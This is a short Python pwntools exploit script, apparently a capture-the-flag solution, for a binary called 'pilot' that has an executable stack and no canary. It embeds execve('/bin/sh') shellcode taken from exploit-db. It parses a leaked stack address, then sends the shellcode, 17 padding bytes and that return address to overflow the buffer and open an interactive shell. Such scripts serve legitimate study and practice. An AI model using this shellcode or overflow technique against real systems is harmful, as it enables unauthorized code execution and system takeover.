#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pilot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pilot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

# context.logl_level = 'DEBUG'

# From: https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

io = start()

io.recvuntil(b"Location:")
addr = int(io.recvline()[2:-1].decode(), 16)
io.recvuntil(b"Command:")
io.sendline(shellcode + b"A"*17 + p64(addr))

io.interactive()

